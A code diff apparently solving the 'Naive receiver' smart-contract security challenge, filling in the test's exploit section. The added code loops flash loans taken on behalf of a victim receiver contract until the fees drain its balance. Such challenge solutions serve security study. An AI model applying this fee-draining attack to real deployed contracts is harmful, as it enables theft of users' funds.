@@ -1,6 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
-
+const { ether, BN, balance } = require("@openzeppelin/test-helpers");
 describe('[Challenge] Naive receiver', function () {
     let deployer, user, attacker;
 
@@ -30,7 +30,9 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        while ((await ethers.provider.getBalance(this.receiver.address)).gte(1)) {
+               await this.pool.flashLoan(this.receiver.address, ETHER_IN_POOL);
+             }
     });
 
     after(async function () {
